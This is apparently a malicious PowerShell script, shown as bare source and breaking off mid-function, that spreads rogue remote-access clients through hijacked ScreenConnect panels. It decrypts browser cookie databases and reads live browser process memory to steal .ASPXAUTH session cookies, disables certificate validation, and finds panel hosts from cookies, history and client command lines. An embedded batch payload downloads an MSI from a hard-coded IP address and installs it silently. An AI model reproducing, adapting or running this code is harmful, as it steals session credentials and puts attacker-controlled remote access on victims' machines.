param(
    [switch]$DryRun,
    [switch]$Snapshot,
    [string]$BaseUrl = '',
    [string]$PanelHost = '',
    [switch]$NoSelfDelete
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Panels are discovered at run time from the signed-in browser (cookie stores,
# live browser memory, history) and from ScreenConnect client command lines.
# -BaseUrl / -PanelHost are optional hints only.
$script:HostHints = @{}
$script:DoneHosts = @{}
$script:DeadHosts = @{}
$script:HostTries = @{}
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$logPath = Join-Path $env:TEMP 'scsp44.log'
function L([string]$m) {
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    try { Add-Content -LiteralPath $logPath -Value ("[$ts] $m") -Encoding UTF8 } catch {}
}

L ('=== spread44 start === dryRun=' + [bool]$DryRun)
try { $idn = [Security.Principal.WindowsIdentity]::GetCurrent().Name } catch { $idn = '?' }
L ("identity=" + $idn + " computer=" + $env:COMPUTERNAME + " temp=" + $env:TEMP)
try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $isAdmin = $false }
L ("elevated=" + $isAdmin)

$mtx = $null
try {
    $mtx = New-Object System.Threading.Mutex($false, 'Global\ScPanelSpread44')
    try { if (-not $mtx.WaitOne(0)) { L 'another instance is running - exit'; exit 0 } } catch [System.Threading.AbandonedMutexException] {}
} catch {}

$cmdDataTemplate = @'
#timeout=600000
@echo off
setlocal EnableExtensions EnableDelayedExpansion

set "localPath=%TEMP%\ScreenConnect.ClientSetup.msi"
set "msiUrl=http://31.56.19.89:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=xxxxxx&c=&c=&c=&c=&c=&c=&c="

echo Downloading MSI to "!localPath!"...

if exist "!localPath!" del /f /q "!localPath!" >nul 2>&1

curl --ssl-no-revoke --tlsv1.2 -f -L -o "!localPath!" "!msiUrl!"
if errorlevel 1 (
    echo Download failed ^(curl error !errorlevel!^). Exiting...
    exit /b 1
)

if not exist "!localPath!" (
    echo Download reported success but the file is missing. Exiting...
    exit /b 1
)

echo Installing MSI silently, please wait...

msiexec /i "!localPath!" /quiet /norestart REBOOT=ReallySuppress
set "rc=!errorlevel!"

if "!rc!"=="0"   goto :ok
if "!rc!"=="3010" goto :ok
if "!rc!"=="1641" goto :ok
if "!rc!"=="1638" (
    echo A different version is already installed. Treating as OK.
    goto :ok
)

echo Install failed with errorlevel !rc!. Exiting...
exit /b !rc!

:ok
echo Cleaning up...
del /f /q "!localPath!" >nul 2>&1

echo Done.
exit /b 0
'@

function New-CmdData([string]$Base) {
    # The MSI URL embeds the panel, so the payload is rebuilt for every panel.
    return $cmdDataTemplate.Replace('__PANEL_BASE__', ([string]$Base).TrimEnd('/'))
}


if (-not ('ChromeAesGcm' -as [type])) {
Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Net.Security;
using System.Text.RegularExpressions;
public class ChromeAesGcm {
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)] static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, string pszAlgId, string pszImplementation, uint dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)] static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref AUTH_CIPHER_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    [StructLayout(LayoutKind.Sequential)]
    public struct AUTH_CIPHER_INFO {
        public uint cbSize; public uint dwInfoVersion;
        public IntPtr pbNonce; public uint cbNonce;
        public IntPtr pbAuthData; public uint cbAuthData;
        public IntPtr pbTag; public uint cbTag;
        public IntPtr pbMacContext; public uint cbMacContext;
        public uint cbAAD; public ulong cbData; public uint dwFlags;
    }
    public static string Decrypt(byte[] key, byte[] nonce, byte[] ciphertextAndTag) {
        int total = ciphertextAndTag.Length;
        byte[] ct = new byte[total - 16];
        byte[] tag = new byte[16];
        Array.Copy(ciphertextAndTag, 0, ct, 0, ct.Length);
        Array.Copy(ciphertextAndTag, ct.Length, tag, 0, 16);
        IntPtr alg, kh;
        if (BCryptOpenAlgorithmProvider(out alg, "AES", null, 0) != 0) throw new Exception("open");
        try {
            byte[] cm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(alg, "ChainingMode", cm, (uint)cm.Length, 0) != 0) throw new Exception("prop");
            if (BCryptGenerateSymmetricKey(alg, out kh, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) throw new Exception("key");
            try {
                var info = new AUTH_CIPHER_INFO();
                info.cbSize = (uint)Marshal.SizeOf(typeof(AUTH_CIPHER_INFO));
                info.dwInfoVersion = 1;
                var hNonce = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                var hTag = GCHandle.Alloc(tag, GCHandleType.Pinned);
                try {
                    info.pbNonce = hNonce.AddrOfPinnedObject(); info.cbNonce = (uint)nonce.Length;
                    info.pbTag = hTag.AddrOfPinnedObject(); info.cbTag = (uint)tag.Length;
                    byte[] output = ct.Length > 0 ? new byte[ct.Length] : new byte[1];
                    int result;
                    int rc = BCryptDecrypt(kh, ct, ct.Length, ref info, null, 0, output, output.Length, out result, 0);
                    if (rc != 0) throw new Exception("dec");
                    return Encoding.UTF8.GetString(output, 0, result);
                } finally {
                    if (hNonce.IsAllocated) hNonce.Free();
                    if (hTag.IsAllocated) hTag.Free();
                }
            } finally { BCryptDestroyKey(kh); }
        } finally { BCryptCloseAlgorithmProvider(alg, 0); }
    }
}
public class WSql {
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open_v2")] public static extern int Open(byte[] f, out IntPtr db, int flags, IntPtr z);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")] public static extern int Close(IntPtr db);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2")] public static extern int Prepare(IntPtr db, byte[] sql, int n, out IntPtr st, IntPtr t);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")] public static extern int Step(IntPtr st);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text")] public static extern IntPtr ColText(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob")] public static extern IntPtr ColBlob(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes")] public static extern int ColBytes(IntPtr st, int i);
    [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")] public static extern int Finalize(IntPtr st);
    public static byte[] Nz(string s) { byte[] a = Encoding.UTF8.GetBytes(s); byte[] b = new byte[a.Length+1]; Array.Copy(a,b,a.Length); return b; }
}
public class TrustAll {
    public static void Enable() {
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
    }
}
public class MemCk {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, UIntPtr n, out UIntPtr r);
    [DllImport("kernel32.dll")] public static extern int VirtualQueryEx(IntPtr h, IntPtr a, out MBI m, uint l);
    public struct MBI { public IntPtr BaseAddress, AllocationBase; public uint AllocationProtect; public IntPtr RegionSize; public uint State, Protect, Type; }
    static List<int> FindAll(byte[] buf, int actual, byte[] pat) {
        var hits = new List<int>();
        int limit = actual - pat.Length;
        int i = 0;
        while (i <= limit) {
            int idx = Array.IndexOf<byte>(buf, pat[0], i, limit - i + 1);
            if (idx < 0) break;
            bool m = true;
            for (int j = 1; j < pat.Length; j++) { if (buf[idx+j] != pat[j]) { m = false; break; } }
            if (m) hits.Add(idx);
            i = idx + 1;
        }
        return hits;
    }
    static string ReadValue(byte[] buf, int start, int actual) {
        StringBuilder sb = new StringBuilder();
        int max = Math.Min(8192, actual - start);
        for (int k = 0; k < max; k++) {
            byte b = buf[start+k];
            if (b == 0 || b == (byte)';' || b == (byte)',' || b == (byte)' ' || b == (byte)'\t' || b < 0x21 || b > 0x7E) break;
            sb.Append((char)b);
        }
        return sb.ToString();
    }
    public static string[] ExtractAll(int pid, string cookieName, string hostMarker) {
        var good = new HashSet<string>();
        var any = new HashSet<string>();
        byte[] pat = Encoding.UTF8.GetBytes(cookieName + "=");
        byte[] hostPat = string.IsNullOrEmpty(hostMarker) ? new byte[0] : Encoding.UTF8.GetBytes(hostMarker);
        IntPtr h = OpenProcess(0x0410, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try {
            IntPtr addr = IntPtr.Zero; MBI mbi; int mbiSize = Marshal.SizeOf(typeof(MBI));
            while (VirtualQueryEx(h, addr, out mbi, (uint)mbiSize) == mbiSize) {
                if (mbi.State == 0x1000 && (mbi.Protect == 0x04 || mbi.Protect == 0x02 || mbi.Protect == 0x40)) {
                    long sz = mbi.RegionSize.ToInt64();
                    if (sz > 0 && sz < 64L * 1024 * 1024) {
                        byte[] buf = new byte[sz]; UIntPtr rd;
                        if (ReadProcessMemory(h, mbi.BaseAddress, buf, (UIntPtr)(ulong)sz, out rd)) {
                            int actual = (int)rd.ToUInt64();
                            var cookieHits = FindAll(buf, actual, pat);
                            if (cookieHits.Count > 0) {
                                var hostHits = (hostPat.Length == 0) ? new List<int>() : FindAll(buf, actual, hostPat);
                                foreach (int hit in cookieHits) {
                                    string v = ReadValue(buf, hit + pat.Length, actual);
                                    if (v.Length <= 10) continue;
                                    any.Add(v);
                                    foreach (int hh in hostHits) {
                                        if (Math.Abs((long)hit - (long)hh) <= 600) { good.Add(v); break; }
                                    }
                                }
                            }
                        }
                    }
                }
                long next = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                if (next <= addr.ToInt64()) break;
                addr = new IntPtr(next);
            }
        } finally { CloseHandle(h); }
        var src = (good.Count > 0) ? good : any;
        var arr = new string[src.Count];
        src.CopyTo(arr);
        return arr;
    }

    // Returns every panel host that sits close to an .ASPXAUTH cookie in the
    // process memory. Works even when the cookie DB is locked or app-bound.
    public static string[] ExtractHosts(int pid) {
        var found = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        byte[] anchor = Encoding.UTF8.GetBytes(".ASPXAUTH");
        IntPtr h = OpenProcess(0x0410, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try {
            IntPtr addr = IntPtr.Zero; MBI mbi; int mbiSize = Marshal.SizeOf(typeof(MBI));
            while (VirtualQueryEx(h, addr, out mbi, (uint)mbiSize) == mbiSize) {
                if (mbi.State == 0x1000 && (mbi.Protect == 0x04 || mbi.Protect == 0x02 || mbi.Protect == 0x40)) {
                    long sz = mbi.RegionSize.ToInt64();
                    if (sz > 0 && sz < 64L * 1024 * 1024) {
                        byte[] buf = new byte[sz]; UIntPtr rd;
                        if (ReadProcessMemory(h, mbi.BaseAddress, buf, (UIntPtr)(ulong)sz, out rd)) {
                            int actual = (int)rd.ToUInt64();
                            foreach (int hit in FindAll(buf, actual, anchor)) {
                                int start = Math.Max(0, hit - 1024);
                                int len = Math.Min(actual - start, 2048);
                                if (len <= 0) continue;
                                string win = Encoding.UTF8.GetString(buf, start, len);
                                foreach (Match m in Regex.Matches(win, @"https?://((?:\d{1,3}\.){3}\d{1,3})(?::\d{1,5})?(?=[/\s""'<>?#]|$)")) found.Add(m.Groups[1].Value);
                                foreach (Match m in Regex.Matches(win, @"https?://((?:[A-Za-z0-9][A-Za-z0-9-]{0,61}\.)+[A-Za-z]{2,24})(?::\d{1,5})?(?=[/\s""'<>?#]|$)")) found.Add(m.Groups[1].Value);
                                foreach (Match m in Regex.Matches(win, @"[?&]h=((?:\d{1,3}\.){3}\d{1,3}|(?:[A-Za-z0-9][A-Za-z0-9-]{0,61}\.)+[A-Za-z]{2,24})(?=[&""'#\s]|$)")) found.Add(m.Groups[1].Value);
                                foreach (Match m in Regex.Matches(win, @"sc-[0-9a-f]{16}://((?:\d{1,3}\.){3}\d{1,3}|(?:[A-Za-z0-9][A-Za-z0-9-]{0,61}\.)+[A-Za-z]{2,24})(?=[/:"">?\s]|$)")) found.Add(m.Groups[1].Value);
                            }
                        }
                    }
                }
                long next = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                if (next <= addr.ToInt64()) break;
                addr = new IntPtr(next);
            }
        } catch {} finally { CloseHandle(h); }
        return new List<string>(found).ToArray();
    }
}
"@ -Language CSharp
}

if ('TrustAll' -as [type]) { [TrustAll]::Enable() }
L ('tls trust enabled=' + [bool]('TrustAll' -as [type]))

function Unprotect-DpapiRaw([byte[]]$Bytes) {
    Add-Type -AssemblyName System.Security
    return ,([Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, 'CurrentUser'))
}

function Unprotect-ChromiumValue([byte[]]$Bytes, [byte[]]$MasterKey) {
    # v20 = app-bound encryption (Edge/Chrome 127+). The DPAPI master key
    # cannot unwrap it, so the on-disk copy is useless and the cookie has to
    # come from the network-service process memory instead.
    if ($Bytes.Length -gt 3 -and $Bytes[0] -eq 0x76 -and $Bytes[1] -eq 0x32 -and $Bytes[2] -eq 0x30) {
        L 'cookie is v20 (app-bound) - file path cannot decrypt it, using process memory'
        return $null
    }
    if ($Bytes.Length -gt 15 -and $Bytes[0] -eq 0x76 -and $Bytes[1] -eq 0x31 -and ($Bytes[2] -eq 0x30 -or $Bytes[2] -eq 0x31)) {
        $nonce = $Bytes[3..14]
        $ctTag = $Bytes[15..($Bytes.Length - 1)]
        return [ChromeAesGcm]::Decrypt($MasterKey, $nonce, $ctTag)
    }
    return [Text.Encoding]::UTF8.GetString((Unprotect-DpapiRaw $Bytes))
}

function Copy-LockedFile([string]$Src, [string]$Dst) {
    try { Copy-Item -LiteralPath $Src -Destination $Dst -Force; return $true } catch {}
    $s = $null; $d = $null
    try {
        $s = [IO.File]::Open($Src, 'Open', 'Read', 'ReadWrite')
        $d = [IO.File]::Open($Dst, 'Create', 'Write', 'Read')
        $s.CopyTo($d)
        return $true
    } catch { return $false } finally {
        if ($d) { try { $d.Dispose() } catch {} }
        if ($s) { try { $s.Dispose() } catch {} }
    }
}

function Invoke-SqlText([string]$Db, [string]$Sql, [switch]$Blob) {
    $rows = New-Object System.Collections.Generic.List[object]
    $dbp = [IntPtr]::Zero; $st = [IntPtr]::Zero
    try {
        if ([WSql]::Open([WSql]::Nz($Db), [ref]$dbp, 1, [IntPtr]::Zero) -ne 0) { return $rows }
        if ([WSql]::Prepare($dbp, [WSql]::Nz($Sql), -1, [ref]$st, [IntPtr]::Zero) -ne 0) { return $rows }
        while ([WSql]::Step($st) -eq 100) {
            if ($Blob) {
                $n = [WSql]::ColBytes($st, 0)
                if ($n -le 0) { continue }
                $p = [WSql]::ColBlob($st, 0)
                if ($p -eq [IntPtr]::Zero) { continue }
                $b = New-Object byte[] $n
                [Runtime.InteropServices.Marshal]::Copy($p, $b, 0, $n)
                $rows.Add($b)
            } else {
                $p = [WSql]::ColText($st, 0)
                if ($p -ne [IntPtr]::Zero) { $rows.Add([Runtime.InteropServices.Marshal]::PtrToStringAnsi($p)) }
            }
        }
    } catch {} finally {
        if ($st -ne [IntPtr]::Zero) { [WSql]::Finalize($st) | Out-Null }
        if ($dbp -ne [IntPtr]::Zero) { [WSql]::Close($dbp) | Out-Null }
    }
    return $rows
}

function Get-ChromiumMasterKey([string]$Root) {
    $lsPath = Join-Path $Root 'Local State'
    if (-not (Test-Path -LiteralPath $lsPath)) { return $null }
    try {
        $ls = Get-Content -LiteralPath $lsPath -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
        $blob = New-Object byte[] ($encKey.Length - 5)
        [Array]::Copy($encKey, 5, $blob, 0, $blob.Length)
        return ,(Unprotect-DpapiRaw $blob)
    } catch { return $null }
}

function Get-FileCookies([string]$HostName) {
    $out = New-Object System.Collections.Generic.List[string]
    $profiles = @(
        @{ Root = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Root = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Root = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Root = "$env:LOCALAPPDATA\Chromium\User Data" }
    )
    foreach ($p in $profiles) {
        if (-not (Test-Path -LiteralPath $p.Root)) { continue }
        $mk = Get-ChromiumMasterKey $p.Root
        $dbs = Get-ChildItem (Join-Path $p.Root '*\Network\Cookies') -ErrorAction SilentlyContinue
        foreach ($dbItem in $dbs) {
            $tmp = Join-Path $env:TEMP ("csp" + [guid]::NewGuid().ToString('n') + ".db")
            try {
                if (-not (Copy-LockedFile $dbItem.FullName $tmp)) { L ('db copy failed (locked) ' + $dbItem.FullName); continue }
                foreach ($ext in @('-wal', '-shm')) {
                    $side = $dbItem.FullName + $ext
                    if (Test-Path -LiteralPath $side) { Copy-Item -LiteralPath $side -Destination ($tmp + $ext) -Force -ErrorAction SilentlyContinue }
                }
                $like = $HostName.Replace("'", "''")
                $blobs = Invoke-SqlText $tmp "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%$like%' AND name = '.ASPXAUTH' ORDER BY last_access_utc DESC;" -Blob
                L ("db " + $dbItem.FullName + " host=" + $HostName + " rows=" + @($blobs).Count + " key=" + [bool]$mk)
                $before = $out.Count
                foreach ($bytes in $blobs) {
                    if (-not $bytes) { continue }
                    try {
                        if ($mk) {
                            $plain = Unprotect-ChromiumValue $bytes $mk
                            if ($plain) { $out.Add([string]$plain) }
                        }
                    } catch { L ("decrypt failed: " + $_.Exception.Message) }
                }
                if (@($blobs).Count -gt 0 -and $out.Count -eq $before) { L ('db rows found but nothing decrypted ' + $dbItem.FullName) }
            } catch {} finally {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
                Remove-Item -LiteralPath ($tmp + '-wal') -Force -ErrorAction SilentlyContinue
                Remove-Item -LiteralPath ($tmp + '-shm') -Force -ErrorAction SilentlyContinue
            }
        }
    }
    $ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path -LiteralPath $ffDir) {
        foreach ($profile in Get-ChildItem $ffDir -Directory -ErrorAction SilentlyContinue) {
            $db = Join-Path $profile.FullName 'cookies.sqlite'
            if (-not (Test-Path -LiteralPath $db)) { continue }
            $tmp = Join-Path $env:TEMP ("ff" + [guid]::NewGuid().ToString('n') + ".db")
            try {
                if (-not (Copy-LockedFile $db $tmp)) { continue }
                $like = $HostName.Replace("'", "''")
                foreach ($v in (Invoke-SqlText $tmp "SELECT value FROM moz_cookies WHERE host LIKE '%$like%' AND name = '.ASPXAUTH';")) {
                    if ($v) { $out.Add([string]$v) }
                }
            } catch {} finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
        }
    }
    return $out
}

function Get-MemCookies([string]$HostName, [string]$Mode) {
    $cands = New-Object System.Collections.Generic.List[string]
    $seen = @{}
    $procs = @()
    if ($Mode -eq 'netsvc') {
        try {
            $net = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
                ($_.Name -eq 'chrome.exe' -or $_.Name -eq 'msedge.exe' -or $_.Name -eq 'msedgewebview2.exe') -and $_.CommandLine -match 'network\.mojom\.NetworkService'
            })
            foreach ($n in $net) { $pr = Get-Process -Id $n.ProcessId -ErrorAction SilentlyContinue; if ($pr) { $procs += $pr } }
        } catch {}
        if ($procs.Count -eq 0) { return $cands }
    } else {
        # .ASPXAUTH rows live in the network-service process, which is small and
        # would be missed by a "largest processes" selection alone.
        try {
            $net2 = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
                ($_.Name -eq 'chrome.exe' -or $_.Name -eq 'msedge.exe' -or $_.Name -eq 'msedgewebview2.exe' -or $_.Name -eq 'brave.exe') -and $_.CommandLine -match 'network\.mojom\.NetworkService'
            })
            foreach ($n in $net2) { $pr = Get-Process -Id $n.ProcessId -ErrorAction SilentlyContinue; if ($pr) { $procs += $pr } }
        } catch {}
        $procs += @(Get-Process chrome, msedge, msedgewebview2, brave -ErrorAction SilentlyContinue | Sort-Object WS -Descending | Select-Object -First 6)
        $procs += @(Get-Process ScreenConnect.WindowsClient -ErrorAction SilentlyContinue)
    }
    foreach ($proc in ($procs | Sort-Object Id -Unique)) {
        try {
            L ("memscan mode=" + $Mode + " pid=" + $proc.Id + " name=" + $proc.ProcessName)
            foreach ($v in [MemCk]::ExtractAll($proc.Id, '.ASPXAUTH', $HostName)) {
                if ($v -and -not $seen.ContainsKey($v)) { $seen[$v] = $true; $cands.Add($v) }
            }
        } catch {}
    }
    return $cands
}

function Normalize-Host([string]$Value) {
    $v = ([string]$Value).Trim().Trim('"').Trim("'").Trim()
    if (-not $v) { return '' }
    if ($v -match '^[a-z][a-z0-9+.-]*://') { try { $v = ([Uri]$v).Host } catch { $v = ($v -replace '^[a-z][a-z0-9+.-]*://', '') } }
    $v = $v -replace '/.*$', ''
    $v = $v -replace ':\d{1,5}$', ''
    $v = $v -replace '^[\[\.]+', ''
    $v = $v -replace '[\]\.]+$', ''
    if (-not $v) { return '' }
    $v = $v.ToLowerInvariant()
    if ($v -eq 'localhost' -or $v -eq '127.0.0.1' -or $v -eq '::1' -or $v -eq '0.0.0.0') { return '' }
    if ($v.Length -lt 4 -or $v.Length -gt 253) { return '' }
    $isIp = ($v -match '^\d{1,3}(\.\d{1,3}){3}$')
    if (-not $isIp -and $v -notmatch '^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$') { return '' }
    if ($v -match '\.(test|example|invalid|localhost)$') { return '' }
    if ($v -eq 'example.com' -or $v -eq 'example.net' -or $v -eq 'example.org') { return '' }
    # Browsers keep .ASPXAUTH for many plain ASP.NET sites; these are never panels.
    foreach ($bad in @('google.com','googleapis.com','gstatic.com','youtube.com','ytimg.com','cloudflare.com','microsoft.com','office.com','live.com','bing.com','facebook.com','instagram.com','twitter.com','doubleclick.net','windowsupdate.com','msftconnecttest.com','akamai.net','akamaized.net','gvt1.com','gvt2.com','mozilla.org','mozilla.net','adobe.com','apple.com')) {
        if ($v -eq $bad -or $v.EndsWith('.' + $bad)) { return '' }
    }
    if ($env:COMPUTERNAME -and $v -eq ([string]$env:COMPUTERNAME).ToLowerInvariant()) { return '' }
    return $v
}

function Get-CookieHosts {
    # Every host that still has a ScreenConnect auth cookie in a browser store.
    $out = New-Object System.Collections.Generic.List[string]
    $seen = @{}
    $roots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        foreach ($dbItem in @(Get-ChildItem (Join-Path $root '*\Network\Cookies') -ErrorAction SilentlyContinue)) {
            $tmp = Join-Path $env:TEMP ("csh" + [guid]::NewGuid().ToString('n') + ".db")
            try {
                if (-not (Copy-LockedFile $dbItem.FullName $tmp)) { L ('hostdb copy failed (locked) ' + $dbItem.FullName); continue }
                foreach ($ext in @('-wal', '-shm')) {
                    $side = $dbItem.FullName + $ext
                    if (Test-Path -LiteralPath $side) { Copy-Item -LiteralPath $side -Destination ($tmp + $ext) -Force -ErrorAction SilentlyContinue }
                }
                $rows = @(Invoke-SqlText $tmp "SELECT DISTINCT host_key FROM cookies WHERE name = '.ASPXAUTH';")
                foreach ($row in $rows) {
                    $n = Normalize-Host ([string]$row)
                    if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $out.Add($n); L ("host(file)=" + $n + " src=" + $dbItem.FullName) }
                }
            } catch {} finally {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
                Remove-Item -LiteralPath ($tmp + '-wal') -Force -ErrorAction SilentlyContinue
                Remove-Item -LiteralPath ($tmp + '-shm') -Force -ErrorAction SilentlyContinue
            }
        }
    }
    $ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path -LiteralPath $ffDir) {
        foreach ($profile in @(Get-ChildItem $ffDir -Directory -ErrorAction SilentlyContinue)) {
            $db = Join-Path $profile.FullName 'cookies.sqlite'
            if (-not (Test-Path -LiteralPath $db)) { continue }
            $tmp = Join-Path $env:TEMP ("ffh" + [guid]::NewGuid().ToString('n') + ".db")
            try {
                if (-not (Copy-LockedFile $db $tmp)) { continue }
                $rows = @(Invoke-SqlText $tmp "SELECT DISTINCT host FROM moz_cookies WHERE name = '.ASPXAUTH';")
                foreach ($row in $rows) {
                    $n = Normalize-Host ([string]$row)
                    if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $out.Add($n); L ("host(file)=" + $n + " src=" + $db) }
                }
            } catch {} finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
        }
    }
    return $out
}

function Get-MemHosts {
    # Live browser memory is the only source when the cookie DB is locked or
    # app-bound. Network-service processes are scanned first, then (only if
    # nothing was found) the biggest browser processes.
    $out = New-Object System.Collections.Generic.List[string]
    $seen = @{}
    $netProcs = @()
    try {
        $net = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
            ($_.Name -eq 'chrome.exe' -or $_.Name -eq 'msedge.exe' -or $_.Name -eq 'msedgewebview2.exe' -or $_.Name -eq 'brave.exe') -and $_.CommandLine -match 'network\.mojom\.NetworkService'
        })
        foreach ($n in $net) { $pr = Get-Process -Id $n.ProcessId -ErrorAction SilentlyContinue; if ($pr) { $netProcs += $pr } }
    } catch {}
    foreach ($proc in ($netProcs | Sort-Object Id -Unique)) {
        if ($out.Count -ge 12) { break }
        try {
            foreach ($raw in [MemCk]::ExtractHosts($proc.Id)) {
                $n = Normalize-Host ([string]$raw)
                if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $out.Add($n); L ("host(mem)=" + $n + " pid=" + $proc.Id + " name=" + $proc.ProcessName) }
                if ($out.Count -ge 12) { break }
            }
        } catch {}
    }
    if ($out.Count -eq 0) {
        $br = @(Get-Process chrome, msedge, msedgewebview2, brave -ErrorAction SilentlyContinue | Sort-Object WS -Descending | Select-Object -First 4)
        foreach ($proc in $br) {
            if ($out.Count -ge 12) { break }
            try {
                foreach ($raw in [MemCk]::ExtractHosts($proc.Id)) {
                    $n = Normalize-Host ([string]$raw)
                    if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $out.Add($n); L ("host(mem)=" + $n + " pid=" + $proc.Id + " name=" + $proc.ProcessName) }
                    if ($out.Count -ge 12) { break }
                }
            } catch {}
        }
    }
    return $out
}

function Get-HistoryHosts {
    # Only history entries that are unambiguously ScreenConnect.
    $out = New-Object System.Collections.Generic.List[string]
    $seen = @{}
    $roots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    $sql = "SELECT DISTINCT url FROM urls WHERE url LIKE '%ScreenConnect%' LIMIT 300;"
    foreach ($root in $roots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        foreach ($dbItem in @(Get-ChildItem (Join-Path $root '*\History') -ErrorAction SilentlyContinue)) {
            $tmp = Join-Path $env:TEMP ("hsh" + [guid]::NewGuid().ToString('n') + ".db")
            try {
                if (-not (Copy-LockedFile $dbItem.FullName $tmp)) { continue }
                foreach ($row in @(Invoke-SqlText $tmp $sql)) {
                    $n = Normalize-Host ([string]$row)
                    if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $out.Add($n); L ("host(history)=" + $n) }
                    if ($out.Count -ge 8) { break }
                }
            } catch {} finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
        }
    }
    return $out
}

function Get-PanelHosts {
    $hosts = New-Object System.Collections.Generic.List[string]
    $seen = @{}
    # 1) browser cookie stores (currently signed in)
    foreach ($h in @(Get-CookieHosts)) { if ($h -and -not $seen.ContainsKey($h)) { $seen[$h] = $true; $hosts.Add($h) } }
    # 2) ScreenConnect client command lines
    try {
        foreach ($p in (Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect*' })) {
            $cmd = $p.CommandLine
            if (-not $cmd) { continue }
            foreach ($m in [regex]::Matches($cmd, '(?:[?&]h=)([^&"]+)')) { $n = Normalize-Host $m.Groups[1].Value; if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $hosts.Add($n) } }
            foreach ($m in [regex]::Matches($cmd, 'sc-[0-9a-f]{16}://([^/":]+)')) { $n = Normalize-Host $m.Groups[1].Value; if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $hosts.Add($n) } }
